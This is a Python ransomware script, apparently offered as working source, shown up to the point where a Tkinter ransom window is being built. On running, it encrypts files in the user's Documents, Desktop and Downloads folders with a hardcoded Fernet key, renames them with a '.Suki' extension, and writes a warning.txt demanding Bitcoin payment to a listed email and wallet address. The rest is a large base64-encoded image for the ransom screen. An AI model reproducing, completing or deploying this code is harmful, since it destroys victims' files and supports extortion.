from tkinter import *
from tkinter.ttk import *
import os, time, threading, base64, sys, random
from cryptography.fernet import Fernet
from os import listdir
from os.path import isfile, join, isdir

paths = ["//Documents", "//Desktop", "//Downloads"]
script_dir = os.path.abspath(sys.argv[0]).split("\\")
script = script_dir[-1]
main_path = os.environ['USERPROFILE']
warn_message = ("""YOUR FILES HAVE BEEN ENCRYPTED !
TO RECOVER YOUR FILES SEND US 10$ BITCOIN
AND SEND THE PAY CONFIRMATION WITH YOUR
TASK NUMBER TO : h3xv1ss1on@protonmail.com
BITCOIN : 1782x9AtVCQgv6GPjb9uHj1EoFhQocgEMs
-Suki@H3xv1ss1on""")

def pass_gen(lenght, action):
  lower = "abcdefghijklmnoqrstuvwxyz"
  upper = lower.upper()
  numbers = "0123456789"
  symbols = "[]{}()*;/,._-"
  if action == "with":
    mix = lower + upper + numbers + symbols
  if action == "without":
    mix = lower + upper + numbers
  lenght = lenght
  password = "".join(random.sample(mix, lenght))
  return password
  
key = "koWFCjKg3wd1MRkOTpIEjcBzv0vYY9qOsEypY33sayE=" 
''' key for testing only you can use Cryptography module to generate one !'''
extension = ".Suki"

def get_files_list(mypath):
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]
    return files_list
def get_desktop_files():
    path = os.environ['USERPROFILE'] + "\\Desktop"
    desktop = []
    files = []
    def get_folder_list(mypath):
        files_list = [f for f in listdir(mypath) if isdir(join(mypath, f))]
        return files_list
    for folder in get_folder_list(path):
        desktop.append(path + "\\" + folder)
    for p in desktop:
        for i in get_files_list(p):
            files.append(p + "\\" + i)
    return files        

def encrypt(file, key):
    f = Fernet(key)
    cipher = f.encrypt(file)
    return cipher

for path in paths:
    os.chdir(main_path + path)
    current_directory = os.getcwd()
    warn = open("warning.txt", "w+")
    warn.write(warn_message)
    for file_name in get_files_list(current_directory):
        if file_name == script or file_name == "warning.txt":
            pass
        else:    
            with open(file_name, "rb") as file:
                file = base64.b64encode(file.read())
            try:
                data = encrypt(file, key)         
                dest = open(file_name, "wb")
                dest.write(data)
                dest.close()
                os.rename(file_name, file_name + extension)
            except:
                pass
for file_name in get_desktop_files():
    if file_name == script or file_name == "warning.txt":
        pass
    else:    
        with open(file_name, "rb") as file:
            file = base64.b64encode(file.read())
        try:
            data = encrypt(file, key)         
            dest = open(file_name, "wb")
            dest.write(data)
            dest.close()
            os.rename(file_name, file_name + extension)
        except:
            pass    

class mainwindow(Tk):
    def __init__(self, special_key):
        Tk.__init__(self)
        self.title(string="Warning!!!")
        self.resizable(0, 0)
        self.configure(background='black')
        self.style = Style()
        self.style.theme_use("clam")
        self.special_key = special_key
        photo_code = '''R0lGODlhWAIOAtUAAAAAAAAAABAOABAQECAbACAgIC8pADAwMD83AEBAQE9EAFBQUF9SAGBgYG9fAHBwcH9tAH9/f457AI+Pj56IAJ+fn66WAK+vr76kAL+/v86xAM/Pz92/AN/f3+3MAO/v7/3aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAUKAAAALAAAAABYAg4CAAb/QIBwSCwaj8ikcslsOp/QqHRKrVqv2Kx2y+16v+CweEwum8/o9DcTWSQKgfggkYhUOuq8fs/v+/+AgYKDTB8VC3GJiosBBQ0XhJGSk5SVlpeYkR0NA4yengUReJmkpaanqKmqZ5ufrq4No6uztLW2t7h/EZ2uCAgQwAoIBK8BsbnIycrLzMsbB58KEhog1dbWHhYOxJ4DFc3g4eLj5HoVvIoCEBzX7e4gGgwCng0f5ff4+fr7RQ2M6h7eCWznAcK8RQfs8VvIsKFDUx8QLVLAbqDFawUPJiqw4aHHjyBDovkALR2FiyjbaTCwaEBHkTBjypxZqGQiA9RS6qzmgUHL/5c0gwod6jDBIgMBdyoF4QChQqJQo0pd5k8Rg6VYQVBwOrWr16+mIiy6mhXrVkUNwKpdy/bPhUUIypZtqmhC27t4837pgC4AUrllfSoCqrew4cNLbAYQkBQwVg8sNz5FTLmyXrGKcjrOykGjMcugQ6vtsEjCZsAWFmUQzbr1UKOJFMjlgKE2hopZ6cYp4Lq3b5AZ0jXeiUEeIwIMMDzmFsfu7+fQ88FJZFopBgTF/Cq3rmjA5OjgwyPDHIeAUg8KsitCgDsl9kRpxcufP+tD3+0pNXhWv9jCTg6LEEbfgARWUlUccelEwX78xXGSThAokkCBFFY4yAaLtGfRWQ168v8gSh549o2FJJaoBmxxQKCTfh268uFFHDbynYk01rjFW4kwllKILb6C30XvxRGBjUQWacUH0zmoU5A9eqIjShgsIouRVFaZBHl+6SRBk8UkiJJgcSxg5ZhkCsGXIj8OxCOXr1R3UWeKrFbmnEUeGABZX7JZzJMXRZjIAXQGSmNwOWookAZ6ZueATswF4JygkBaomIruJZqdZhalloh3kXY6XwWKEDDcQDFa+omXQCrygKesRmefIv6B2Kipn8T6ZoCt5toblqha5Cetr4iakm4BTKjrsaCRlllKcAJbDKUXrRkHJMhWexiKd+qUnrN7GvpOjLxZKy5ehMbBp0VRcpv/nWwpRSbkuPCulWQAbl7krro+ppSuHFPG6y9RE4SqIL7qGaAtWv8mPNSriaQpkLQEv/LiQM3GIafCGMNkZ68DERuxK+cO9GsAgGZs8kcYKuKtOwB+rN6isioy4sk0L4QttKm6rN7K7Wgqx4w1By0OjuaOKtC+One5pKpCNz0OkopMPNCsSbtiq0WIKtKv01zngqXBKY1cdbA6gVls12jncmbDOzI49ic4q+nZxWnXrYqd7Ob5tnoC8HzNlhvZLTgq5S7mtzVZ760enhc1OuTgkGNy89LOQsCkng6/gzSnkXcuCaiJCItSqZaKmniiHAu0bRzxee46IAwrGbOzsXrM/6bU77ScCN2v954HrxBy6yXEbIYs0MjG+q48GsomginFbuvZHuCWxv1wozMvr70YEsXBuEWr02r9vdKnFCPn26ffReHGa86t8Ujrmfo7TD6u/v1ZzGu9QORbijsIZsOcvqSEvwJWIWChG5iz5geCiunJPCkxm5gMSMEnxC4AmXMH8Sz1vHaIjU31klucKkjCJTxgPTqxXaJgZhGqNal97hhZuEpIQyKkLBGHq4buaAXDa8SPTd+bWl1qSEQAYIuFOQPW/9wRPj110H2bAloR70e0xRgNisACG7NoxcB2MKl1UzTgvJbYDhcKcCcf5BIZrbHDAAgojOn7WvCcFcRomf+xRaLrk4TgiL+1xSGDBIkel3o4EJ8lan8a9Ay1+Lg9vJWNWyHcyeXYlEOtKKIAUmRk59hXydOZSotY8SSb8mYvRdhPk72bXKWcBchh0aqV1tjc1lAJOdCV54ruIF2iSJmVDTYJlBaRIC1dd8E18uSOL6wkjGgVydzNbZidA17YuIVIrPTvhbj0oCJKBk3BNe+PzBJkkyB4mh9yCYktHGI37da9bKWkiZaC5VICyKYnusOQ6Fsn19iXTR9yi5eb8WWPungNJq1Kn13Tn06uWb7T/I1WVxuIJ2eJUJMhsDwKBFY1HYPMBuXRIsRKXkVpdsGIPkycPfqoQ6thziZtFBv/ihxpzU6YCIJaI416MulKQQDPZKaEeo2Q6cm+GYBKttFSNnWMA4G4UFMKNWNHpBywlAkYnPZIniCQ5VMTVkVCxpKaO1VTR/kDzIGED4xbHde8mvmOsXbIqys1pJ6M2cBnpnVccvwpt+i60klic5p/uqu4LohVgXIpqTs96jl3hD3BVsuREeSWPcPaDhU2qZLny6RjA1W4ouaHW+ik7ElNhdj6bTZXqkSJX4vXT9FaQ5dN0qk7JnpaT9kyACoViFz951qpPvCRiRBpbekEtUTQ1QNubVBZe3so8bVthMMNlDRRYlUuYZW5ADQVXEEA1BlGl0xExepSE1VH7L7DsB0q/687HPfdMrVTve2gp562a17uvnKAUWyvlfiJX2Cxtb7vYGiLEHtW/VZpUk3NIoCJQyu6tvGNBi7RRXGb0fsu+GCW2i7yImyjkj4XWAC9MPRM9VKeiIjDNKIpgubIQ6qKuLodwuwlNYti8RDVqGAVsVKSq7RVvqvGFYqqj01FTh3rZLfW7W8cKApk8HS1tSzl1nWNbI3V4hG4YWoygdbKKGeFmMoWUWyT/osRu2pZPFgqskWAaioXgxkEMOaPhi95ZvEQ9sPOffN5ePwK+F6jUY+q83Mgqzda5VbPyzTVZK+BTxoLujI3jEMnuSVbRFvEyh0qLdMe7ZvUJpG0lg5lg/+3OBhOu+a220VyQ0OtFMviEcpM2aOpRVNc2dmxcqx+DEr5U2IQQGyRs67MdPUILPrm+qFtNt+Mg10ZP2IwnM7i67HbIeAOfdkd9zolswvzXiyDetpYaelVlTwAJm9bLZxUsqLBnRX59mi57xDmufWC4HY5K7TshralyMxGM8+bLbdVM6mcZex8XyPOfIP1yLj5b7V4GES77hC/DS5ES+Fbg41tuFpUHADEIly5FC+LuFu0aGs0WuNfIWrJdSjlkJelpwP17UFRPhUhq5aOLi+LmHtU6WvQluZR4S+UCA7rnL/j48U4tDtCCvSocDklfM7OxI1+PRLjOQDAbvpM0qz/JWcJnOo7UXWL+qbXwGmdJneGOCvBLhdMN8jP1sj22WdC6Iu4m0vXZjtKRJnkoed37iKJtGf3TnA36/0aru4QvJmIMMCHxNOXxvXhy4LeBjlYNY7/CKphLfZxTh4wsB27wmWd+YbUOgDHjXoxpvz5AJvq4gTJeOkXklfqLrD1gBl5jJX999nrw9nijXiDDI/7a9w9077Vtu/LYSe4V+P4Pep18UVoqZ4jjoDLv0e6/W7ook9fIGzm0tfjTfrsj6PeKKk2z7/PUaurfXfmH0fAYR36JiGW/QPRvZxHb/b4N+Ph0SJ8/EF8+HcNMNcizgcCgOZ/zTBsvnJvBahUApgv/9wXAPnEgLigcqTGQ94XgcfzbTcHHxiYDNiSgG7XItLmgVXHWyjxYCOIC0J3EfqHfCroGJ3XIHMWXC94C0+HEqr3CitXgyF4SFeXPTuYChM2fu4QfnoCe0L4H7QiY5JxhKqQdgFYbB34hAKReA2iaYmgfFSYCRvjbfumhQE1ga6AVfFjbmEoCYI3aQpmhptRfx7lbRPUhpkAeQNxgh3CenK4h6YydQ7EO3g4CU+WEjeIgH94GnzXIzkYBwxXiJJweqmHhYt4GtDHHwm4gJI4CbVHbMx0iadRefwRhCfXiYQAfPpGZKLoUEwYc0M2c6gYCM1Hhonih604EOrHH5dXav+zCAjbJ4NeBm4eYBvGiAFZWF8zmB1KV1nl94t8gH6l1GKWpgEU4AAIsGsGoAAQgIuudYAd0mu/Bo19MH+8l2dgZgEM8IOxkYKiNV6XdY5BRY56UExXlyhKaF4c4ABo+AoC4AAEeBpI9wp5dw1yR49q4IAis3Y6xgGZyCYQkIwOxY6LoIbdwYYI2QUa2IK3J2IFoTMCYH2ulYgFg2Gsk5FnUIK+ZSkBKXIU2SMJGFZ8KHWrGACEiJJeEIPoInkL9oof8xcXtnNvxX+QiJNjoFBQByzNKFoPiS9AuWAD6QpOiA2yZ5RdkIRdBywiuVNNSTBPWV/ItW4ocYpWuQVWaBH/pNiFF9aVEfOV5kWH/OGFcSCLZYkFHIdYbJkdLTlPivMJMelQM1kMW/lzdXkFb/hZwDKVO+WTfemOjtGIrxZZOliYV2Bzn5YoBQcYkNmXhnNhXMhrV3eTlOkEhziW0QZgYcmZvXBhadktZbcbo0kFY8RYwHJ/m/GZnOmYgMGYb9dlXxibUfCJDwgsQciIqpkdmekYu6geFtl7wLkEqtiC/SiVCxaYfSl9DrWMxbB47VBgz8kEdRdMlqiMx5lwa2kqvQh/35kEwbiT/lWd5akeU7dS8Ch6gBUHwrWeRKCH/BOH9SWU8ZlAFxaVn6CYvlaV+ikE5jg6DFlfuBmg3ggY/y+JQ/J4getpj+9nKn+5GRM6Nhu6Gdr5CnIZAGD4nAr5gRy4YJsZoOmgY9aZhuqGkWW5kbfynj3JoqUoYgDKH/lofIpwh+vZbUOGjyIGjjhKHTpGoJ4gjv4GnDqZfw0KYNOpmgUpWqk5X0Q5j9+JlD4IYh55pOrRoyOpob7ZHN+Jla+ZYXsZbmCqHlT2op/QnD8DnGdJfe53YSQJphH6mCD4aWhVl3dpi2wipqKlpOW5p47xoMWQnnEAYTh5mISnlUZmqMeJnWHVmv6YpflplJYZeVxEZZSqmpYaVnCpHkyqCFmHk6V5EXk6gKDaptkxqmG1nHopj5hUlz2Ilh2aCP+yulKhypm9ulIh6gpVWg0HaZTCuZDdB2a/ep16lpdxSm4yWoh1KhD1GVtv1qo4GqwrhamuQKjZlQhAipDhORDQuppvNqwByq2+Gog1KZqo2FmVpK5AqGcrCqu6SVkd+ogkg5L86Xq0YqDmBaurZ2n0ygibqE7kuKCJpl0SSVlTqpqIulNGmqOm6ZyoSIn3OFehBqfl+bCUda1qGYvkeKJHV5us5rHHmWvNinqImQjTioHhtYFiaWktOzbgipodupTWwHSzKKRDaCkfylw3WzW2WV/a6gqnmgipGoZPejTjGWoHy5nFKmIqmw6V1F2oKI3pFIq5NrXOemw7qh5Ve6z/bYimKMGbigduBPsJ8yliikqBwrgpMet7AIiWEcsIE+taebs3e2ulfZsl79R4YRiokkmm4Ha1ilOcOlaqNCmd0HWEN/ayGQay2FWxOGpwils093k2VNipgIiO01a0LiMABge2iWCgVxoARsiAq5opSmlwasuiR6tj58oIQZhZO5irYgUsf9tbqDs2VQtm3noqyfeCyYqipjK8VDa26xpys5sdg4l9/letzkSNFNe2peFytEo2h+u5/leuAnG7S+pyu6ozv4tdwRsAS2sx/iev6vZbLre5VbOmAIa5rpm2dBZ//4ptkupycauaRieymlimJGp+myePqGN0pEswOWuz/6YipxboaDSnsRnKkka3vi5Tu3rWodxpgIRbeiYbQxpFdRr8MQLLakn7CYzqRrMXnTVKZJZrZNqbImxHv/y6qVoHtJeZU2wXuC6TvgvmvMWguifmeO0JpZ96wzUsxFCZbAw6hYDHtRVXs1RHvlVzeMXrCSNaohoXcFn5eofXwO8zeY5bsBUYAHXLaXdrp5g5w2B2xn3JwSlbOnZ4doZbaCyodyeML0PLavdqqqHZdDSKNSg7eR6gvexqaQHsJFnqXRoHugJBv87Tetq7lQa3xQhrwIH2b0/7DivsCn+ca5RMME5sZNGLxqzaHRQsaLy7gpWLe/jbl9PXvegatHS5bf9c17mJ8rYGR8Y8NH3r28KOysb3UZN68sFGJ8dvQ8fghsWcixI+e27iS34Whnt9jHPTR8CCfMFN+2iQOreIW3yJDKuLfGwtK4W70coo1r/UlqLfR7CYbHQdWrZOFWwJHMV3Wsuwesp6tr4SXG6zZsFXyIr4V8rcEoH0C65m86dnNsLadM3fB8yYGYFE3CbvymkwHGZeWoCpPDbOTHHNyq+RqGU87KlqGoHZPM74t7pc4nyr27o1lsRQK7rsd9FVc875Fsq4i4isXGdULBDn+8Bs16bzrHf0O6K5zGEMu2b/64G2nDT+DMjoSblq3GRtPFp9qtBg+oSNfBywNs0olsf/djdVQkjRg/SEmrwI7Yt1NVbIElXCQvjROhPSy5zS+tt/EaaSQzqocBxyK92EZhjVnmDPvxlhn3xPT12DOO0yOu1yAE1u7PxUr3xe52vXVHekU/3MlqLM1eCd7YW2oMhBckjYEcO4uLfWiiCImPdd1ssyQBwAKVx8CG0pizjSmtpeY/i9WPqHaH1li9ihqougjhXO7lnVf0jXEYPZbLe+ufvTteXOBrnEfxjYLiWKs3zLn+bFQvW6AyfRZtjYBOPL38fN0mvVa0xLBI23tDLKlgyhrdisDP2MW5W8J+uwrWja6mK/eufS133B8IpQG00xNiqKtc0muQgCPI21nQvJ/0JVi33NJZ6tgr9NVgkOAvSbsInQySNF01gUTwmu3OrCvBYdwZK9VUHdVu194dYdjhcea4ky4V/0VE09ECLuJPw9eeK9Vy+u2sZFsy48Ull9XrH92O99nJtNdczsyJ2rw8ME0YhnaC9urB875RhucUVYUXDdXOCdi9mtLqZr5eurzjKCUHwdtHpC4jVY4T1m5dDccce7TondM9g75UuuzVbu4+BUgQLdTZWt4vv84i3ezVZuX0T6veOqSaI9nKXz199Xzpx51INdPRmt3scMuaYi6Vp4nKhthsFL0sO023osP4VeUAJc6tbw5Z6g4WaqScatxFCM6m8ufqjebyB+sf9zykiSTD82Xehsbry1Xg3NqtSM5N0CceeewLO5uOBEGOzV0KHEzEezecEc6+yDjtHOruCxLM30TUP2TcJbXeucmeS0TenePEUDbq3Eme3VENstkuMeuOMZYqtTVM2MJ8bsfuWKk+/CbimG/WM05OHuoMHJeYlfvcD8rufPxufp/TrSbQ3nm6+3rThq3orILjCDK4IlVOPgR935fu3ly+/VQL+C2KT4g6EFfev8HsiUJvLVwPKZ2rklfT9Q3rMr7vIgoDjkjn8HbxW0mQgyvT1b/g4wvyeObobn2yA4b2KkjesTbEAnHbpluPQHvidLXw03jkIkiz9zzmi0MuGl3vP/9nf1VJ4odEWY6cOljdPl/J71TTLbhR68yh6u+Hk/i66sQkv2WfU2Rr6Ib97WAd45r90O5o2c8C6H8t4kOx/vfUt2eQ2b20PW4hnoS/82h+/b/m7A3A05r17Tdqz3ZZ80oA/xKn/cT688u+4Opbz4Klj1nwD21t7ZJvkZvmPs30IrFV/qvx4AuV/qJA/kgV83057y83X5i+j2Lj76LPfGTd473x7R5q78IG9ryt+swy0zrpPuubOsyt9AVcP6QujfPULmt9o59t6dENX91pDF6l8NF19TcQ458JvGbMLcVq7fb9X+VVZ9MQoEAOGQWDQekUnlktl0PqFR6ZS6TASw/wEIiNv1eglZ8ZhcDnC+afWa3Xa/4XE5HGG23+2I+Z7f9//hNPAGAwjiGMQWqhYZGx0fISMbK8QIPOAkCAm3ADs9P0G7IDRJyxxCUVNV3RxKzTjdPATEMiRtb3FzdSU/CsQo4GRdzSxXjY9RM4ddYZGdn/eEl7ME0N5Gswp2t7m7vXMjxPTgWqfHgKHT1dswzEkx1uPluyjcsRjiwrImvvv9/wEa6TAG3htB9rCMm7cQGgeEg6wxlIjMAMKCbtplGfAhYEePHyUtEIOPzsMAGiamNGbyjkqXqTK6MxCnTpYGIHHm1MkkgxgBl95YMHnqZVFPFVmSmWmU6R9E9tC5cf8oZsNOq1dzHhDTrI0+ez+bht1TM6kYBWLRxpFmDuw1MQmwxpXbb0KlONgQRk27Vw3esli48hXMxe+0wGrWBrgwl3FjWx8GiLEAh8MshAoHZ1b2F4vezIO9movYpl42jo5Rp57yQNwhkxc/C47JGXZsvrOnYW6DFEsE1b+BKxkoZjQb3OZI2hY8lXMAoMoFK7AIZ/aADsGxZ7+Shegbsu7aQufbPIAA8YOZmzME5ykWRdnhp77g8zlpkxLOC+ZdVnd+sYWXOSyNymiJz0DGfMkCvzcSM2cp/9L6LqnkIBTLg9CWCa8Nvw440MOrwsniQTcAnKa2Cpkq8SEBUXxJKHv/KOxKDH4+rPEjyMQ4UY303ImxRaM2K2uyH8WScBkd03gRi41sbBKgBsyKQzqEqiEyrONeszIsHpfpb43vHnBSTG96Io46k1jUUiIuTVIzrHLc8WyNg7K4bsw7c9kOsHweWs9Nozjz88+XGhymmDfgDAAuPBmNhJIsDnUjSHeQHJQhDB/y0lKJSnMnzS4SW6zRURfp5ZdgLLPnrE1fMhKh7lhVyVVXilsjSG1IzVWKEBOKI1F3ao11oV9XFNYlLF1Z9Y39fNPVWSaGy6JSL+i051Nj01GRUmxVas+cabuozs5nyTVCpCx8/LLP+ridB1l3UGpXokJdEbSNKbG4qdx9/4UoE4sqgzJpSHkXetccgieadJkFpUo1gFr4LVerLK7lAtMuEZaoLHszjufiUjRkw69FI3a2LkjvMinYjqFx+DKWC0Yo3TQuFKOCknXFMYuB2yAQoYphVmXWaWANWh18zYnXjU4DYBLnUVnLQtM0vGWLXaOfqdparOPx2Zypv/iu2afxjBYLpdkxSU6ukdH2SLbXcVsTntmoNoBxyRZTzwCKZmPoUsCGOxWmEUJbcGc+JiXSNrwlOe8m/S3vajUIT/pwaAwe5vJ0lDSn4sQgftzGBLFguA16h+l7c1XYnIbj1Vf5mxCAJRUDV9E/5LWQlKmcHHZUWAr8d09aL0VZN/9CGxv3+HTGAlwuindl7eFD2c8d1akPRW5CngehutOWhw/KLI6/96ERs09FdlKATp8P1ElBnw2k9Q0fuw3GWPmLzN9xfxVip0E3/4GicsMwHRt4VBX7BWdvQEtcKWY2QEBsTxPdk+BYvuK7L4xsgcB51L806AWFZSiEF+RD59xhwlTYbRnY+0JibtZB1JgqC9N7ocumcUAVAoJ/mtghKrQ2DP15gWkFAJ8M56I74XEBgMOQ3w/94IFMQREU8NPEEkEgNiQypgORkVYgskRFTzykfGL0wwhdIUA14AZvW7TKue5BEzKa8Sg/o2Md3fE6NXjrPW60SuRo1wYUTiOQd+T/w/oGoUNDzqGHePicw0Lnx6xshU92XKQfgugKC15yj18ZoihsJ0mdfHB3cKDgIPTISbfYY5Oq9ILXphHBL4SGRqL0SPMCoMYB4fBtrtwDGkvhyz6c8g7d65zTbBmQqPWKPXMUJiMR8kw+PJAQT1QDmJIZELOd5EwP+aQ0vdDIPIATmlChzBgUmM1+7M2FYSsWOeNgDyzCM4sZJMdb1NkPQJaQCwU0FD/pCQIYBfScW2OQw0SVT26QLgCKpBkvh6FLgoLBUxNdJbDgUMQjKhQXukvlBqdo0TYg0g7to2fN3IFFZnFUF7jsXvRK8c2JktQMEhVpP6fzBnGxFBfjY+Yb/5DmuZuOdFtD9Zs9PuoFb9WPp5DAn5l0+pCQGRWU36LqnCzZsAI1FRINrKQ5r5oGYpahlQRtIimm2hcxdIirjpgPNQAKTMCFVa1WpesNB8qg0MSwrVWgYWdQ9RDD3XWsZCgrQf1ZCmOKAZl93ZUYrJmGs5ainVQtLEHuqgbrDQOL2HSsFLqYIzD2LrMgFU1p95eX0dbps1HwaQBk6QWa3sGGYZXrIFBLNaQCNFGOa+0SACnTQS4jsnQVJxmSGlYrbiKwWUjob5UwsT3BgZoVzK0XpBjL65oWo2+4FXSXQMrFiewhsaWrBTaLBwEwAKBhrS4eyriGlYL3CLi0aRdgSf/I9tJVAxjw738BDODtGienGGHsRukLACW6BiEOHfCDARFUQ0lJDExN8DYHu8bzQZjDoYApIRz8yjFEkr57My8XZmuHw3aYxWK150UVleB+0SejzmzxjfuAUuQEY68yZmiIQQVRkMkUx0X+wnBdkeE0MK2xrT0ZFpJLmHcamcpyTKmVewNelxYUqVX2MpfNcV8u2K2NfX0tFiXcyy+veQ2TJcR419C43z41CzI9rh3iy2Y9L3cQj9yqY71KXW/qmdBL9qQpQ+nYt4IQE1Mu9KPr6Y48p4GWff1rAGobZITAGdJsvjNZu7kkBCtUd8X1gpvn1mlVZzJ+WA6AhRUa2i//GiSkqoY0n/EAZOihs6mvnbQ7EUJkWxf5toNIq4uz4Ft1BhcOSGbGsG393jtUlgswZGmg3yDtOxwb2mv+NBlkqlGFihegly1Dprvt5TTPtSRZUJ4tcYluEOQXY+lWNb3TGOqmldmPC25m4exta3Pb5d/uySaG9W0Oagfcy9p+BWUgmUw4wtbV+mW4rZ2tiUKugUO23GeNG3zxYaeYDCcGQaUlyVA/28PUIv/yhwexWI2M2n5PLiWM7epyVQ9cRK4O0xa3/AaYD8LkOqcyrmkL5gCks4PLDACaSWt0WydW47zFpwzpjAU7P0TXVeaABSDAAASMnewMgIAFhG1kko9h/+VYeG742PlV9XRaAw6QNgEcoOQvs1CIIMfC7cK3aMk1usBs9oAEHF4JCeyXxay+YhzmGz6Gyhvpd/g1jj0AASGjFQKMh3DlzdC9nS6v1L6iUtofjIHE44EAYm5xsVlPYZssT9bOW21F1+wBVMfS8wNObykqBksSP83XFV9GlDnMgd+bxACo3+63aQxjtuaN2QErPJU1sHmTCEDvN3Y8IU6s4wDw9WnYRt7L9q59lnB/zfhWbLMPTDZyIzrY6SdPGdj/ZZ7/1A2eLVm8IS6rjk79/oLbWmz1zuH27gZn/O0Nvu/Neg+11q7Wqgz6IAWg5Cxitkn0HsL1Hmz/BJDKJv+QYpoLC4bPWSbO5EZQal7u/jSh+zps6O5Apr5rXz7uDaiOFJxPAl2QEOZpwEDw8rogefZF5UpQ4b7MAstixUpL/NQsbWaOXGwO+UBw8LxsBZPiB7crB1FJ9vLlWexL6aZB3h6M73pQxdYMC7uOR04QT5wO6uRpzR7wDNFlzcwQrcrt6khlm7YO4L6MAOmwPNhs96aNx2wmV+JO0Oxh4SAs4wJxDDzwwUCvDGAQp0xjVATPALsA9tQrAlGLEB+RESGME8ep3bKsUX7sCHOIzbCQM1qOxZYv1aJKDPjNRkrvnlhOzx4xmDxttwouAPpITILODe7w/exwF0mhEhvPoGL/IeLGpPhMccd6ERm5Z88A0Qw2rq7+bkwi5wzg78XWzBGpEQsikcOCUO5qyUbMT0bsoetYrAqbw6Q4DAFFaxZFrUnmD+eOr9DgkTPkEcKUMABeMdK+sEYuTd7czxj1rB//4h8hbN1IASF5LXda4xenQQhxTBzHkQxbTAax0eqS7UM2MOEyZAdTbxxjDtJAcOFCxUNS0PiGwSEhrBhRkpsezQn7Dgdth+ZU4waXZtNUrSZbotM08g5USgzeLTikSwtU8QkLLRbHcSDVzh5cb/SwYwp558pWTSjLoOiKjCa78BeD8TfCUOgGTdWK8hHLschA8eGEzhmB4w29UKhsLbu4/1IMPJHFJnEMshHZsGD6VIMPSfKfoA0iqREjv4wL8cDkUE41EjHbEGItjSwtz1Ayp7Ko3OCYeBIrMjGu0K/b6PEvkM/b4jAafw41UvGg6i/dFPMMOVIOwYoYx6AWQYTgEOVVGA4qz3A0De8a8Q8ksUDZsGIY2wAsjS0vjSwgH4IJq4wU3bIZxeDtsAIavUO1Lq4t/0IUCy00tY7wtnEuss4brU8rL84DdLM5DAA5K7A0lwUp52Id2YA7z0bnsg8Z88/lDLMa7XHf4oKUNFHKFlHqKFNgpC4h32wuYQ0nDrIpXeE/oa011UbqAJQutSoL2tAjGtAN5jDXJNQSe/A16/+SOx2Ug3ai9gKAA3OxQ8fMN4fhPjt0QEvOELOA/EDiJaPRRFQUv1rRDBDAJG0NC5WRyTZTn3wi3GQmRzeIRdVLJqHNI8ugs9wTJ5byc+TTQV2OAzaU6Hy020BQ3sgMJMQrK83BHY0OS3tkS9NtLysBA/UwIMpSKoASSU+HAvJzDBSAAtQz4CD0OU8HLgFCLuGgTlNSTqkDAhQAARxGABBAASAAA/JU5LCQBhMNIBBuPy+SUDE1HozT8uQuKb3hMd3gPLcNTTO1VOUgS0NP35qsG3yyDZyTT001VldBTVEmGhN0G1ITOvNIVnn1GF6VDNZwIr3Bo0yPKnv1WFVBVD//kv6C8xuIE4E+E1ml1RMCkiUdhkZ1gTr7bzWntVsjzB6CdCe5ITyFKwS99VznwEAHAUrdjRvgcw3kk9PQdV5JxFgtlTYfwT/z0F7ptV/ljjAdMBFaavIYlN389WANDPd01QTBAbIYDF4QNmKJii1kyi8ALxJMFEWvR2I5dkdUBR1v4bVUEBw7tmRBAARl7h4jofp+MjZNtmRxshQG0v8eYUpl9GteNmdBYE/PTemYjhHysV7BVWdzdgUdtLce4U175kiJ9mU31Q6sNTodIUPNBzwetWljFTvBze8CwIgYoVIT1h3IFGvPlVb5bzeitApMDPJSlGxf9lchUVXxFbii/692WMltdVZZywD5lqoKcrVP8wpvXzYgg89PnwArcdFqBFdnUZUM+pK7AgAwneBZ18BJy4BJFxdZzZbi9OoQoeDMYLIUeDNz0RVlv1Flm4BcTzfnSPdluZNdseA0meBd1UA+EbN16TUgvXQ2m6AzmZWQSBV3e1VQ7eBo2xQJFlQ1FVZ4X9Zy2e4IpbMIbG4gGxe5mLdpQVBSs2EJGEpjw+x6iTZmSQGLegwJSAkxsVALwRddYRSz9vNiiWBvvHcagnd9e3UFke87sBUAsm5mmdF+c/ZpzUDeZkM4X0si8+hqAZhXtdZh4WA/2qh5zMM7CYnsLPiCMTiDNXiDObiDPf/4g0E4hEV4hEm4hE34hFE4hVV4hVm4hV34hWE4hj9YbymRa2UXAEiJEWn4Lnm4h334h4E4iIV4iIkYC6L2O4dg4mTKLou4iZ34iaE4iqV4in2Yb6mCCLxIIONAOam4i734i8E4jMUYGfswdofAbICGIcd4jdm4jd34jb/YA1Nl+gTPgtQYjvE4j/V4j/mYPIDGW05Dd9rrjvu4kA35kBG5kIGGaSDmteSAkBM5kiV5kinZiYEmPZpFT+YJkiu5kz35k0HZBdunwoRAk+WAZ0M5lVV5lVnZXI+qWQFADETReVu5lm35lmt5k8iCrShJDuQTl4E5mIW5j+cgUYSgl8X/dJiVeZmZ2ZC90i+OmQTlYHObuZqt+Zp/uJWgGQCy+Ha5AG6xOZzFeZwD0ZtBwJgBwJQxiJzZuZ3dORAfV13+spRrdQ7M853xOZ/1mV/lgCwWRZDfZ4f3eaAJWpxBlAtIGYfrMRp2tKAd+qFZWQAsE5OFIOu08wskQEkheqM5GpR71A8YeQiyeHRfiAE0uqNROqX7mAAO2guQBnxeSxlPRwIEWqVt+qbFWAEsU8SyADAFzyt7hgIcoKFxuqiN+i4NgAHw9BMShUYZqn6xC8AgYKqpuqqt+qqxOqu1equ5uqu9+qvBOqzFeqzJuqzN+qzROq3Veq3Zuq3d+q3hWqwl/+C/oLraUqXJdAeoF3iv16Fvi4By+TqwGeJLjcCjFFiwETug09YIGMqcE/uxPcFbVnUIulGvIfuy94BwopcInI5zMfuzQ4FwbrUI9sazQfu0QXoMDmBIheADllIgDxu1A/tXrOMJXJsvd1q2H1v5xmAAfpYJbnsMPlq3iTtJe/u3m+ADXgtd6rq4M5cCMOUAkPtwebSlnRt3D+9iFoC1mWADXpsaGMACYvu6OZYD6NQMBiAdJyGLy8AAHIACmJO8JRYDJIABYnEB5nYKPiAC2Nsoxy6uATzABXzACbzADfzAETzBFXzBBfxQSSoBLtQRPqACvvuoLfzCJ7kBIlwSNkbgARgKw0E8xPH4ACaAu2+hAyZgAT5cxFm8xaG4ABqgAkycGz4gAyYgAhIgx/vbxXm8x+lwAHJ8ASJgAjZcxoz8yJH8KoIAADs='''
        photo = PhotoImage(data=photo_code)
        photo = photo.subsample(4)
        label = Label(self, image=photo, background='black')
        label.image = photo
